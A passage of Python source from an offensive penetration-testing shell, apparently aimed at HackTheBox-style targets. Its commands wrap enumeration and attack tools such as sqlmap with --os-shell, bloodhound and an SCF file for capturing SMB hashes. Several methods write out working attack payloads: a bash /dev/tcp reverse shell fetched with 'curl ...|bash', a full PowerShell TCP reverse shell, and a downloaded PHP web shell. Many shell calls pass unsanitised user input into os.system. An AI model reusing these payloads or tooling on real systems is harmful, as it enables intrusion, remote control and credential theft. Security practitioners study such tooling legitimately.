        os.system(f"gobuster dir --url http://{rhost}/ --wordlist {dirwordlist} {line}")
        return

    def do_addhosts(self, line):
        """
        Adds an entry to the `/etc/hosts` file, mapping an IP address to a domain name.

        :param line: The domain name to be added to the `/etc/hosts` file.
            - Example: `permx.htb`

        :returns: None

        Manual execution:
        To manually add a domain to the `/etc/hosts` file, use the following command:

            sudo sh -c -e "echo '<rhost> <domain>' >> /etc/hosts"

        Example:
            sudo sh -c -e "echo '10.10.11.23 permx.htb' >> /etc/hosts"

        This command appends the IP address and domain name to the `/etc/hosts` file, enabling local resolution of the domain.
        """

        rhost = self.params["rhost"]
        if not rhost or not line:
            print_error(
                f"Add domain and rhost must be set to more info see help set (set rhost 10.10.10.10) ex: addhost domain.ext {RESET}"
            )
            return
        print_msg(
            f"Try... sudo -- sh -c -e \"echo '{rhost} {line}' >> /etc/hosts\"; {RESET}"
        )
        os.system(f"sudo -- sh -c -e \"echo '{rhost} {line}' >> /etc/hosts\";")
        print_msg(f"Done... add {line} to /etc/hosts {RESET}")
        return

    def do_cme(self, line):
        """
        Performs an SMB enumeration using `crackmapexec`.

        :param line: Not used in this function.

        :returns: None

        Manual execution:
        To manually run `crackmapexec` for SMB enumeration, use the following command:

            crackmapexec smb <target>

        Example:
            crackmapexec smb 10.10.11.24

        This command will enumerate SMB shares and perform basic SMB checks against the specified target IP address.
        """

        rhost = self.params["rhost"]
        if check_rhost(rhost):
            print_msg(f"Try... crackmapexec smb {rhost}")
            os.system(f"crackmapexec smb {rhost}")
            print_msg(f"Done... crackmapexec smb {rhost}")
        return

    def do_ldapdomaindump(self, line):
        """
        Dumps LDAP information using `ldapdomaindump` with credentials from a file.

        :param line: The domain to use for authentication (e.g., 'domain.local').

        :returns: None

        Manual execution:
        To manually run `ldapdomaindump` for LDAP enumeration, use the following command:

            ldapdomaindump -u '<domain>\\<username>' -p '<password>' <target>

        Example:
            ldapdomaindump -u 'domain.local\\Administrator' -p 'passadmin123' 10.10.11.23

        Ensure you have a file `sessions/credentials.txt` in the format `user:password`, where each line contains credentials for the LDAP enumeration.
        """

        rhost = self.params["rhost"]
        if not rhost or not line:
            print_error(
                "Add domain and rhost must be set to more info see help set (set rhost 10.10.10.10) ex: addhost domain.ext"
            )
            return
        path_cred = "sessions/credentials.txt"
        if not os.path.exists(path_cred):
            print_error(
                "You must have file sessions/credentials.txt with this format: user:password"
            )
            return
        # Abre el archivo en modo de lectura
        with open(path_cred, "r") as file:
            # Recorre cada línea del archivo
            for file_line in file:
                params = file_line.split(":")
                user = params[0]
                passwd = params[1].replace("\n", "")
                print_msg(
                    f"    {GREEN}[*] Try... ldapdomaindump -u '{line}\\{user}' -p '{passwd}' {rhost}"
                )
                os.system(
                    f"cd sessions && ldapdomaindump -u '{line}\\{user}' -p '{passwd}' {rhost}"
                )
        return

    def do_bloodhound(self, line):
        """Perform LDAP enumeration using bloodhound-python with credentials from a file.

        :param line: This parameter is not used in the function but could be used for additional options or domain information.

        :returns: None

        Manual execution:
        To manually run `bloodhound-python` for LDAP enumeration, use the following command:

            bloodhound-python -c All -u '<username>' -p '<password>' -ns <target>

        Example:
            bloodhound-python -c All -u 'usuario' -p 'password' -ns 10.10.10.10

        Ensure you have a file `sessions/credentials.txt` with the format `user:password`, where each line contains credentials for enumeration.
        """
        rhost = self.params["rhost"]
        url = self.params["url"]
        domain = get_domain(url)

        if check_rhost(rhost):
            path_cred = "sessions/credentials.txt"
            if not os.path.exists(path_cred):
                print_error(
                    "You must have file sessions/credentials.txt with this format: user:password more help createcredentials"
                )
                return
            with open(path_cred, "r") as file:
                for file_line in file:
                    params = file_line.split(":")
                    user = params[0]
                    passwd = params[1].replace("\n", "")
                    dc = input("enter DC subdomain example dc01: ")
                    print_msg(
                        f"    {GREEN}[*] Try... bloodhound-python -u '{user}' -p '{passwd}' -d '{domain}' -gc '{dc}.{domain}' -ns {rhost} -c all --zip"
                    )
                    os.system(
                        f"cd sessions && bloodhound-python -u '{user}' -p '{passwd}' -d '{domain}' -gc 'dc01.{domain}' -ns {rhost} -c all --zip"
                    )
        return

    def do_ping(self, line):
        """Perform a ping to check host availability and infer the operating system based on TTL values.

        :param line: This parameter is not used in the function but could be used for additional options or settings.

        :returns: None

        Manual execution:
        To manually ping a host and determine its operating system, use the following command:

            ping -c 1 <target>

        Example:
            ping -c 1 10.10.10.10

        The TTL (Time To Live) value is used to infer the operating system:
        - TTL values around 64 typically indicate a Linux system.
        - TTL values around 128 typically indicate a Windows system.

        Ensure you have set `rhost` to the target host for the command to work.
        """

        rhost = self.params["rhost"]
        if check_rhost(rhost):
            print_msg(f"Try... ping -c 1 {rhost} ")
            # Ejecutar el comando ping y capturar la salida
            result = subprocess.run(
                ["ping", "-c", "1", rhost], capture_output=True, text=True
            )

            # Verificar la salida y determinar el sistema operativo basado en TTL
            if result.returncode == 0:
                # El ping fue exitoso, parsear la respuesta para obtener el TTL
                try:
                    ttl_index = result.stdout.find("ttl=")
                    if ttl_index != -1:
                        ttl_value = int(
                            result.stdout[ttl_index + 4 : ttl_index + 7]
                        )  # Obtener el valor de TTL
                        print_msg(f"TTL:{ttl_value}")

                        # Determinar basado en el TTL
                        if ttl_value <= 60 or ttl_value <= 64:
                            print_msg(
                                f"{GREEN}Host activo {CYAN}probablemente es {BLUE}Linux{RESET}"
                            )
                        elif ttl_value <= 120 or ttl_value <= 128:
                            print_msg(
                                f"{GREEN}Host activo {CYAN}probablemente es {RED}Windows{RESET}"
                            )
                        else:
                            print_error(
                                "No se puede determinar con certeza el sistema operativo"
                            )
                    else:
                        print_error("No se encontró el TTL en la salida del ping")

                except ValueError:
                    print_error("No se pudo convertir el TTL a un número entero")
            else:
                print_error("No se pudo realizar el ping al host")
            print_msg(f"Done... ping -c 1 {rhost} ")
        return

    def do_gospider(self, line):
        """Try gospider for web spidering.

        This function executes the `gospider` tool to perform web spidering. It can either use a URL provided as a parameter or the remote host defined in `self.params`.

        Usage:
            gospider url
            gospider

        :param line: Command parameter that determines the execution mode. Use "url" to specify a URL, or leave empty to use the remote host.
        :type line: str

        - If `line` is "url", the method uses the URL specified in `self.params["url"]`.
        - If `line` is not "url", the method uses the remote host specified in `self.params["rhost"]`.

        :returns: None

        Manual execution:
        1. Ensure that the `gospider` tool is installed on the system.
        2. Set the `url` parameter if using the "url" mode.
        3. Run the method to perform the spidering operation.

        Dependencies:
        - `gospider` must be installed on the system.
        - The `sudo` command must be available for installing `gospider`.

        Examples:
            1. To scan a specific URL: `gospider url`
            2. To scan the remote host: `gospider`

        Note:
            - If `gospider` is not installed, the method will attempt to install it.
            - Ensure that the network and tools are configured correctly for successful execution.
        """
        cmd = f"""{RED}
            ──▐─▌──▐─▌──
            ─▐▌─▐▌▐▌─▐▌─
            ─█▄▀▄██▄▀▄█─
            ──▄──██▌─▄──
            ▄▀─█▀██▀█─▀▄
            ▐▌▐▌─▐▌─▐▌▐▌
            ─▐─█────█─▌─
            ────▌──▐────
        """
        print_msg(cmd)
        rhost = self.params["rhost"]
        if line == "url":
            url = self.params["url"]
            if not url:
                print_error(
                    "If you pass the param url, url mus be set, ex: set url http://url.ext"
                )
                return

            print_msg(f"Try gospider -s {url}")
            os.system(f"gospider -s {url}")

            print_msg(cmd)
            return

        if not check_rhost(rhost):
            return
        if is_binary_present("gospider"):
            print_msg(f"try... gospider -s http://{rhost}")
            os.system(f"gospider -s http://{rhost}")
            print_msg(cmd)
        else:
            print_msg(
                "gospider is not installed, installing... (control + c to cancel)"
            )
            os.system(f"sudo apt install gospider -y && gospider -s http://{rhost}")
            print_msg(cmd)

    def do_arpscan(self, line):
        """
        Executes an ARP scan using `arp-scan`.

        This function performs an ARP scan on the local network using the `arp-scan` tool. The network device to be used for scanning must be specified.

        Usage:
            arpscan

        :param line: Command parameters (not used in this function).
        :type line: str

        - Executes the `arp-scan` command with the specified network device.

        :returns: None

        Manual execution:
        1. Ensure that the network device is set using the appropriate parameter.
        2. Run the method to perform an ARP scan.

        Dependencies:
        - `arp-scan` must be installed on the system.
        - The `sudo` command must be available for executing `arp-scan`.

        Examples:
            1. Set the device parameter using `set device <network_device>`.
            2. Run `arpscan` to perform the ARP scan.

        Note:
            - The network device must be configured and available on the system for the scan to work.
            - Ensure that `arp-scan` is installed and accessible from the command line.
        """

        if not self.params["device"]:
            print_error("device must be set")
            return
        device = self.params["device"]
        print_msg("try to arp-scan sudo arp-scan -I DEVICE --localnet")
        os.system(f"sudo arp-scan -I {device} --localnet")

    def do_lazypwn(self, line):
        """
        Executes the LazyPwn script.

        This function runs the `lazypwn.py` script located in the `modules` directory. The script is typically used for automated exploitation or security testing tasks within the LazyOwn framework.

        Usage:
            lazypwn

        :param line: Command parameters (not used in this function).
        :type line: str

        - Executes the `lazypwn.py` script with Python 3.

        :returns: None

        Manual execution:
        1. Run the method to execute the LazyPwn script.

        Dependencies:
        - The `lazypwn.py` script must be present in the `modules` directory.
        - Python 3 must be installed and accessible from the command line.

        Examples:
            1. Run `do_lazypwn` to execute the LazyPwn script.

        Note:
            - Ensure that `lazypwn.py` is configured correctly before running this method.
            - The script's functionality depends on its implementation in `modules/lazypwn.py`.
        """

        os.system("python3 modules/lazypwn.py")

    def do_fixel(self, line):
        """
        Fixes file permissions and line endings in the project directories.

        This function converts line endings from DOS/Windows format to Unix format for all files in the project directories. This helps to ensure consistent line endings and can prevent issues related to file format mismatches.

        Usage:
            fixel

        :param line: Command parameters (not used in this function).
        :type line: str

        :returns: None

        Manual execution:
        1. Run the method to fix line endings in the specified directories.

        Dependencies:
        - The `dos2unix` command must be installed and accessible from the command line.

        Examples:
            1. Run `do_fixel` to convert line endings for all files in the project directories.

        Note:
            - This method only fixes line endings and does not modify file permissions.
            - Ensure that the `dos2unix` command is installed and functioning correctly.
        """

        os.system("dos2unix *")
        os.system("dos2unix modules/*")
        os.system("dos2unix modules/cgi-bin/*")

    def do_smbserver(self, line):
        """
        Sets up an SMB server using Impacket and creates an SCF file for SMB share access.

        This function configures an SMB server to serve files from the `sessions` directory and generates an SCF file that points to the SMB share. The SCF file can be used to create a shortcut to the SMB share on a Windows system.

        Usage:
            smbserver

        :param line: Command parameters (not used in this function).
        :type line: str

        - Checks if `lhost` is valid using the `check_lhost` function.
        - Creates an SCF file (`sessions/file.scf`) with configuration to access the SMB share.
        - Copies a curl command to the clipboard for downloading the SCF file from the SMB share.
        - Starts an SMB server using Impacket to serve the `sessions` directory.

        :returns: None

        Manual execution:
        1. Ensure `lhost` is set to a valid IP address or hostname.
        2. Run the method to create the SCF file and start the SMB server.
        3. Use the copied curl command to download the SCF file on the target system.
        4. Ensure that `impacket-smbserver` is installed and accessible from the command line.

        Dependencies:
        - The `impacket-smbserver` tool must be installed and accessible from the command line.
        - The `check_lhost` function must validate the `lhost` parameter.

        Examples:
            1. Run `do_smbserver` to set up the SMB server and generate the SCF file.
            2. Use the provided curl command to download the SCF file on the target system.

        Note:
            - The SCF file is used to create a shortcut to the SMB share and should be accessible from the target system.
            - Ensure that the `lhost` parameter is correctly set and that the SMB server is properly configured.
        """

        lhost = self.params["lhost"]
        if not check_lhost(lhost):
            return
        revshell = f"""[Shell]
        Command=2
        IconFile=\\\\\\\\{lhost}\\smbfolder\\icon.ico
        [Taskbar]
        Command=ToggleDesktop
        """.replace("        ", "")
        print_msg(f"Try... echo '{revshell}' > sessions/file.scf ")
        os.system(f"echo '{revshell}' > sessions/file.scf ")
        print_msg(f"echo 'curl http://{lhost}/sessions/file.scf' |  xclip -sel clip")
        print_msg(f"command copied to clipboard")
        print_msg(f"trying sudo impacket-smbserver smbfolder $(pwd) -smb2support ...")
        os.system(
            f"echo 'curl http://{lhost}/sessions/file.scf -o file.scf' |  xclip -sel clip"
        )
        os.system(
            "cd sessions && sudo impacket-smbserver smbfolder $(pwd) -smb2support"
        )
        return

    def do_sqlmap(self, line):
        """
        Uses sqlmap to perform SQL injection testing on a given URL or request file (you can get one with burpsuit or proxy command and foxyproxy plugin for browser). 

        This function allows the execution of sqlmap commands with various options, including testing URL endpoints, reading from request files, and using sqlmap's wizard mode for easy configuration.

        Usage:
            sqlmap req <request_file> <parameter>
            sqlmap req <request_file> <parameter> <database>
            sqlmap req <request_file> <parameter> <database> <table>
            sqlmap -wiz

        :param line: Command parameters for sqlmap.
        :type line: str

        - If `line` starts with `req`, it expects the following formats:
        - `req <request_file> <parameter>`: Tests the specified parameter in the request file for SQL injection.
        - `req <request_file> <parameter> <database>`: Tests the specified parameter and attempts to dump tables from the specified database.
        - `req <request_file> <parameter> <database> <table>`: Tests the specified parameter and attempts to dump data from the specified table in the database.

        - If `line` starts with `-wiz`, it runs sqlmap's wizard mode for interactive configuration.

        - If `line` is empty, it uses the URL specified in `self.params["url"]` to perform SQL injection testing with sqlmap.

        :returns: None

        Manual execution:
        1. If using `req`, provide a valid request file and parameters.
        2. Run sqlmap with the specified options for SQL injection testing.
        3. To use the wizard mode, execute `sqlmap -wizard`.
        4. For URL-based testing, ensure `url` is set and run sqlmap with the URL.

        Dependencies:
        - The `sqlmap` tool must be installed and accessible from the command line.
        - The request file specified in `req` should be located in the `sessions` directory.

        Examples:
            sqlmap req requests.txt id
            sqlmap req requests.txt id database_name
            sqlmap req requests.txt id database_name table_name
            sqlmap -wiz

        Note:
            - Ensure the request file exists and is readable before running sqlmap.
            - The URL must be set for URL-based testing.
            - The wizard mode is useful for interactive configuration if you're unsure about the options.
        """

        url = self.params["url"]

        if line:
            if line.startswith("req"):
                parts = line.split(" ")
                print_msg("Nùmero de parametros: " + str(len(parts)))

                if len(parts) == 2:
                    arg1 = parts[0]
                    arg2 = parts[1]
                    path = os.getcwd()
                    print_msg(path)
                    file = path + "/sessions/" + arg1
                    print_msg(file)
                    if not os.path.isfile(file) or not os.access(file, os.R_OK):
                        print_error(
                            f"El archivo '{arg1}' no existe o no es legible en el directorio sessions."
                        )

                        return
                    print_msg(
                        f"Try... sqlmap -r {arg1} --level 5 --risk 3 -p {arg2} --batch --dbs --threads 10 --time-sec 10"
                    )
                    os.system(
                        f"sqlmap -r {file} --level 5 --risk 3 -p {arg2} --batch --dbs --threads 10 --time-sec 10"
                    )
                if len(parts) == 3:
                    arg1 = parts[0]
                    arg2 = parts[1]
                    arg3 = parts[2]
                    path = os.getcwd()
                    print_msg(path)
                    file = path + "/sessions/" + arg1
                    print_msg(file)
                    if not os.path.isfile(file) or not os.access(file, os.R_OK):
                        print_error(
                            f"El archivo '{arg1}' no existe o no es legible en el directorio sessions."
                        )

                        return
                    command = f"sqlmap -r {file} --dbms=mysql --technique=B -T {arg2} -D {arg3} --dump"
                    command2 = f"sqlmap -r {file} --level 5 --risk 3 -p {arg2} --batch -D {arg3} --tables --dump --threads 3"
                    print_msg(f" 1) {command}")
                    print_msg(f" 2) {command2}")
                    choice = input("    [?] choice the attack 1 or 2:")
                    if choice == "1":
                        print_msg(f"Try... {command}")
                        os.system(command)
                    elif choice == '2':
                        print_msg(f"Try... {command2}")
                        os.system(command2)

            if len(parts) == 4:
                arg1 = parts[0]
                arg2 = parts[1]
                arg3 = parts[2]
                arg4 = parts[3]
                path = os.getcwd()
                print_msg(path)
                file = path + "/sessions/" + arg1
                print_msg(file)
                if not os.path.isfile(file) or not os.access(file, os.R_OK):
                    print_error(
                        f"El archivo '{arg1}' no existe o no es legible en el directorio sessions."
                    )

                    return
                print_msg(
                    f"Try... sqlmap -r {arg1} --level 5 --risk 3 -p {arg2} --batch -D {arg3} -T {arg4} --dump --threads 10"
                )
                os.system(
                    f"sqlmap -r {file} --level 5 --risk 3 -p {arg2} --batch -D {arg3} -T {arg4} --dump --threads 3"
                )
            elif line.startswith("-wiz"):
                print_msg("Try... sqlmap --wizard")
                os.system("sqlmap -wizard")
        else:
            if not url:
                print_error(
                    "url must be set, ex: (set url http://url.com), see <help set> or <help sqlmap> to more info..."
                )
            return

            print_msg(f"Try... sqlmap -u {url} --os-shell --forms --crawl=2")
            os.system(f"sqlmap -u {url} --os-shell --forms --crawl=2")
        return

    def do_proxy(self, line):
        """
        Runs a small proxy server to modify HTTP requests on the fly.

        This function starts the `lazyproxy.py` script, which acts as a proxy server for intercepting and modifying HTTP requests. The server listens on port 8888.

        Usage:
            proxy

        :param line: This parameter is not used in the current implementation.
        :type line: str
        :returns: None

        Manual execution:
        1. Executes the `lazyproxy.py` script to start the proxy server.
        2. The proxy server will run and modify requests as configured in the script.

        Dependencies:
        - The `lazyproxy.py` script must be available in the `modules` directory.

        Example:
            proxy

        Note:
            - Ensure that the `lazyproxy.py` script is correctly configured before running.
            - The proxy server will be accessible at `http://localhost:8888`.
            - To stop the proxy server, terminate the running process manually.
        """


        print_msg("Ejecutando Lazy Proxy ...")
        os.system(f"python3 modules/lazyproxy.py")
        print_msg(
            f"{YELLOW} Shutdown proxy server at sessions in port {RED} 8888 {RESET}"
        )
        return

    def do_createwebshell(self, line):
        """
        Creates a web shell disguised as a `.jpg` file in the `sessions` directory.

        This function performs the following actions:
        1. Runs a Python script `lazycreate_webshell.py` to create a disguised web shell.
        2. Downloads a PHP web shell from a specified URL and saves it to the `sessions` directory.

        Usage:
            createwebshell

        :param line: This parameter is not used in the current implementation.
        :type line: str
        :returns: None

        Manual execution:
        1. Executes the `lazycreate_webshell.py` script to create a web shell disguised as a `.jpg` file.
        2. Downloads a PHP web shell from the GitHub repository and saves it to `sessions`.

        Dependencies:
        - `wget` must be installed for downloading the web shell.
        - The `lazycreate_webshell.py` script must be available in the `modules` directory.

        Example:
            createwebshell

        Note:
            - Ensure that the `lazycreate_webshell.py` script is correctly configured and accessible.
            - Verify the URL in the `wget` command to ensure it points to a valid and safe web shell.
        """

        print_msg("Creando la shell disfrazada de jpg")
        os.system("python3 modules/lazycreate_webshell.py")
        os.system(
            "cd sessions && wget https://github.com/flozz/p0wny-shell/raw/master/shell.php"
        )
        return

    def do_createrevshell(self, line):
        """
        Creates a bash reverse shell script in the `sessions` directory with the specified `lhost` and `lport` values.

        This function performs the following actions:
        1. Checks if `lhost` and `lport` are set. If not, it prints an error message and exits.
        2. Creates a bash reverse shell script using the provided `lhost` and `lport` values.
        3. Saves the script to `sessions/revshell.sh`.
        4. Prints a message with the `curl` command to download and execute the reverse shell script.
        5. Copies the `curl` command to the clipboard.

        Usage:
            createrevshell

        :param line: This parameter is not used in the current implementation.
        :type line: str
        :returns: None

        Manual execution:
        1. Creates or overwrites the file `sessions/revshell.sh` with the bash reverse shell script.
        2. Displays the command to download and execute the script via `curl`.
        3. Copies the `curl` command to the clipboard for easy use.

        Dependencies:
        - Bash must be installed on the target system.
        - `xclip` must be installed for copying the command to the clipboard.

        Example:
            createrevshell

        Note:
            - Ensure that `lhost` and `lport` are set before running this command.
            - The script will listen for incoming connections on the specified `lport` and connect back to `lhost`.
            - Adjust the `lhost` and `lport` as needed for your specific environment.
        """

        lhost = self.params["lhost"]
        lport = self.params["lport"]

        if not lport or not lhost:
            print_msg(
                f"lport and lhost must be set use: set lport 443 and set lhost 10.10.10.10 or use command payload"
            )
            return

        revshell = f"""#!/bin/bash
        bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        """.replace("        ", "")
        print_msg(f"Try... echo '{revshell}' > sessions/revshell.sh ")
        os.system(f"echo '{revshell}' > sessions/revshell.sh ")
        os.system(f"echo 'curl http://{lhost}/revshell.sh|bash' | xclip -sel clip")
        print_msg(f"echo 'curl http://{lhost}/revshell.sh|bash' | xclip -sel clip")
        return

    def do_createwinrevshell(self, line):
        """
        Creates a PowerShell reverse shell script in the `sessions` directory with the specified `lhost` and `lport` values.

        This function performs the following actions:
        1. Checks if `lhost` and `lport` are set. If not, it prints an error message and exits.
        2. Creates a PowerShell reverse shell script using the provided `lhost` and `lport` values.
        3. Saves the script to `sessions/revshell.ps1`.
        4. Prints a message with the command to download and execute the reverse shell script via `curl`.
        5. Copies the `curl` command to the clipboard.

        Usage:
            createwinrevshell

        :param line: This parameter is not used in the current implementation.
        :type line: str
        :returns: None

        Manual execution:
        1. Creates or overwrites the file `sessions/revshell.ps1` with the PowerShell reverse shell script.
        2. Displays the command to download and execute the script via `curl`.
        3. Copies the `curl` command to the clipboard for easy use.

        Dependencies:
        - PowerShell must be installed on the target system.
        - `xclip` must be installed for copying the command to the clipboard.

        Example:
            createwinrevshell

        Note:
            - Ensure that `lhost` and `lport` are set before running this command.
            - The script will listen for incoming connections on the specified `lport` and connect back to `lhost`.
            - Adjust the `lhost` and `lport` as needed for your specific environment.
        """

        lhost = self.params["lhost"]
        lport = self.params["lport"]
        filename = "sessions/revshell.ps1"
        if not lport or not lhost:
            print_error(
                f"lport and lhost must be set use: set lport 443 and set lhost 10.10.10.10 or use command payload"
            )
            return

        revshell = (
            """$client = New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
        """.replace("{lhost}", lhost)
            .replace("{lport}", str(lport))
            .replace("        ", "")
        )

        print_msg(f"Try... echo '{revshell}' > sessions/revshell.ps1 \n")

        with open(filename, "w") as f:
            f.write(revshell)
        f.close()
        print_msg(
            f"Archivo {filename} creado con èxito en el directorio sessions con contenido: {revshell} "
        )
        os.system(
            f"echo 'curl http://{lhost}/revshell.ps1 -o revshell.ps1 ; .\\\\revshell.ps1' | xclip -sel clip"
        )
        print_msg(
            f"echo 'curl http://{lhost}/revshell.ps1 -o revshell.ps1 ; .\\revshell.ps1' | xclip -sel clip"
        )
        return

    def do_createhash(self, line):
        """
        Creates a `hash.txt` file in the `sessions` directory with the specified hash value and analyzes it using `Name-the-hash`.

        This function performs the following actions:
        1. Writes the provided hash value to `sessions/hash.txt`.
        2. Analyzes the hash value using `Name-the-hash`.

        Usage:
            createhash <hash>

        :param line: The hash value to be written to `hash.txt` and analyzed.
        :type line: str
        :returns: None

        Manual execution:
        1. Creates or overwrites the file `sessions/hash.txt` with the specified hash value.
        2. Analyzes the hash value using the `nth` command.

        Dependencies:
        - `sessions/hash.txt` will be created in the `sessions` directory.
        - `Name-the-hash` must be installed and accessible via the command `nth`.

        Example:
            createhash 5f4dcc3b5aa765d61d8327deb882cf99

        Note:
            - Ensure the hash value is correct before running the analysis.
            - The hash value should be provided as a single argument without extra characters or spaces.
        """

        print_msg(
            f"Creando archivo sessions/hash.txt con el siguiente contenido {line}{RESET}"
        )
        os.system(f"echo '{line}' > sessions/hash.txt")
        print_msg(f"Analisando sessions/hash.txt con Name-the-hash {RESET}")
        os.system(f"nth -t '{line}'")

        return

    def do_createcredentials(self, line):
        """
        Creates a `credentials.txt` file in the `sessions` directory with the specified username and password.

        This function performs the following actions:
        1. Validates the input line to ensure it contains a colon (`:`), indicating the presence of both a username and password.
        2. Writes the valid input to `sessions/credentials.txt`.

        Usage:
            createcredentials user:password

        :param line: The input line containing the username and password in the format `user:password`.
        :type line: str
        :returns: None

        Manual execution:
        1. Creates or overwrites the file `sessions/credentials.txt` with the specified username and password.

        Dependencies:
        - `sessions/credentials.txt` will be created in the `sessions` directory.

        Example:
            createcredentials administrator:passwordadministrator123&!

        Note:
            - Ensure the input format is correct: `user:password`.
            - The credentials should be properly formatted with a colon separating the username and password.
        """

        print_msg(
            f"Creando archivo sessions/credentials.txt con el siguiente contenido {line}{RESET}"
        )
        if ":" in line:
            os.system(f"echo '{line}' > sessions/credentials.txt")
        else:
            print_error(
                f"El archivo debe tener este formato usuario:contraseña ej: administrator:passwordadministrator123&!  {line}{RESET}"
            )
            return
        return

    def do_createcookie(self, line):
        """
        Creates a `cookie.txt` file in the `sessions` directory with the specified cookie value.

        This function performs the following actions:
        1. Extracts the cookie value from the provided input line using a regular expression.
        2. Writes the extracted cookie value to `sessions/cookie.txt`.

        Usage:
            createcookie cookie=user_data=valor_base64

        :param line: The input line containing the cookie value in the format `cookie=value`.
        :type line: str
        :returns: None

        Manual execution:
        1. Creates or overwrites the file `sessions/cookie.txt` with the extracted cookie value.

        Dependencies:
        - `sessions/cookie.txt` will be created in the `sessions` directory.

        Example:
            createcookie cookie=user_data=valor_base64

        Note:
            - Ensure the input format is correct: `cookie=value`.
            - The cookie value should be properly encoded and formatted as needed.
        """

        print_msg(
            f"Creando archivo sessions/cookie.txt con el siguiente contenido {line}{RESET}"
        )

        match = re.search(r"cookie=([^&]+)", line)

        if match:
            cookie_value = match.group(1)
            os.system(f"echo '{cookie_value}' > sessions/cookie.txt")
            print_msg(f"Archivo creado con el contenido: {cookie_value}")
        else:
            print_error(
                f"El formato de entrada es incorrecto. Asegúrate de que el formato sea: cookie=user_data=valor_base64  {line}{RESET}"
            )
            return

    def do_download_resources(self, line):
        """
        Downloads resources into the `sessions` directory.

        This function performs the following actions:
        1. Changes to the `sessions` directory and executes `download_resources.sh` to download required resources.

        Usage:
            download_resources

        :param line: Not used in this function.
        :type line: str
        :returns: None

        Manual execution:
        1. Runs the `download_resources.sh` script in the `sessions` directory to download necessary resources.

        Dependencies:
        - `download_resources.sh` must be present in the `sessions` directory.

        Example:
            download_resources

        Note:
            - Ensure that the `download_resources.sh` script is present in the `sessions` directory and is executable.
            - After running this command, you can use the `www` command as indicated by the printed message.
        """

        os.system("cd sessions && ./download_resources.sh ")
        print_msg(f"Resources downloaded now you can run command {MAGENTA}www {RESET}")
        return

    def do_download_exploit(self, line):
        """
        Downloads and sets up exploits in the `external/.exploits/` directory and starts a web server to serve the files.

        This function performs the following actions:
        1. Changes to the `external` directory and executes `install_external.sh` to install necessary components or exploits.
        2. Displays the IP addresses associated with network interfaces and copies the IP address of `tun0` to the clipboard.
        3. Lists the contents of the `external/.exploit` directory and starts a web server on port 8443 to serve the files in that directory.
        4. Prints a message indicating the server's status and the port it's running on.

        Usage:
            download_exploit

        :param line: Not used in this function.
        :type line: str
        :returns: None

        Manual execution:
        1. Runs the `install_external.sh` script to set up necessary components or exploits.
        2. Displays network interface IP addresses and copies the IP address of `tun0` to the clipboard.
        3. Lists the contents of `external/.exploit` directory.
        4. Starts a Python HTTP server on port 8443 in the `external/.exploit` directory to serve files.

        Dependencies:
        - `install_external.sh` must be present in the `external` directory.
        - `xclip` must be installed for clipboard operations.
        - Python 3 must be installed to run the HTTP server.

        Example:
            download_exploit

        Note:
            - Ensure that the `install_external.sh` script is correctly configured and present in the `external` directory.
            - The HTTP server will be accessible on port 8443.
            - The function assumes the presence of `external/.exploit` directory and serves files from there.
        """

        os.system("cd external && ./install_external.sh ")
        os.system(
            'ip a show scope global | awk \'/^[0-9]+:/ { sub(/:/,"",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, "/"); print "    [\033[96m" iface"\033[0m] "a[1] }\''
        )
        os.system(
            "ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1 | xclip -sel clip"
        )
        os.system(
            'echo "[\e[96m`pwd`\e[0m]\e[34m" && cd external/.exploit && ls && echo -en "\e[0m"'
        )
        print_msg(f"Web server at external/.exploit in port {RED} 8443 {RESET}")
        os.system("cd external/.exploit && python3 -m http.server 8443")
        print_msg(
            f"Shutdown Web server at external/.exploit in port {RED} 8443 {RESET}"
        )
        return


    def do_dirsearch(self, line):
        """
        Runs the `dirsearch` tool to perform directory and file enumeration on a specified URL.

        This function executes `dirsearch` to scan a given URL for directories and files, while excluding specific HTTP status codes from the results. If `dirsearch` is not installed, the function will attempt to install it before running the scan.

        Usage:
            dirsearch <url>

        :param line: Not used in this function. The URL is provided via the `url` parameter.
        :type line: str
        :returns: None

        Manual execution:
        1. If `dirsearch` is present, the command `dirsearch -u <url> -x 403,404,400` is executed.
        2. If `dirsearch` is not present, the function installs `dirsearch` using `sudo apt install dirsearch -y` and then runs the command.

        Dependencies:
        - `dirsearch` must be installed. If not present, it will be installed using `sudo apt`.
        - Ensure the URL is set via the `url` parameter before calling this function.

        Example:
            dirsearch http://example.com/

        Note:
            - Ensure that the `url` parameter is set before calling this function.
            - The `-x` option specifies HTTP status codes to exclude from the results (e.g., 403, 404, 400).
            - The function will attempt to install `dirsearch` if it is not already installed.
        """

        url = self.params["url"]
        if not url:
            print_error(
                "Url must be set: use set url http://url.ext/ more info in help set"
            )
            return
        if is_binary_present("dirsearch"):
            print_msg("[*] Try... dirsearch -u http://url.ext/ -x 403,404,400")
            os.system(f"dirsearch -u {url} -x 403,404,400")
        else:
            print_error(
                "dirsearch is not installed, installing... (control + c to cancel)"
            )
            os.system(
                f"sudo apt install dirsearch -y && dirsearch -u {url} -x 403,404,400"
            )
        return

    def do_john2hash(self, line):
        """
        Runs John the Ripper with a specified wordlist and options.

        This function executes John the Ripper to crack hashes using the specified wordlist and additional options. If no additional options are provided, it will attempt to display cracked hashes.

        Usage:
            john2hash <options>

        :param line: Optional arguments to be passed to John the Ripper (e.g., `--format=Raw-SHA512`). If not provided, the function will default to showing the cracked hashes.
        :type line: str
        :returns: None

        Manual execution:
        1. If `line` is provided, the command `sudo john sessions/hash.txt --wordlist=<wordlist> <options>` is executed.
        2. If `line` is not provided, the command `sudo john sessions/hash.txt --wordlist=<wordlist>` is executed to display the cracked hashes.

        Dependencies:
        - John the Ripper must be installed and available in the system's PATH.
        - Ensure the wordlist file exists at the specified path.
        - The `sessions/hash.txt` file must contain the hashes to be cracked.

        Example:
            john2hash --format=Raw-SHA512
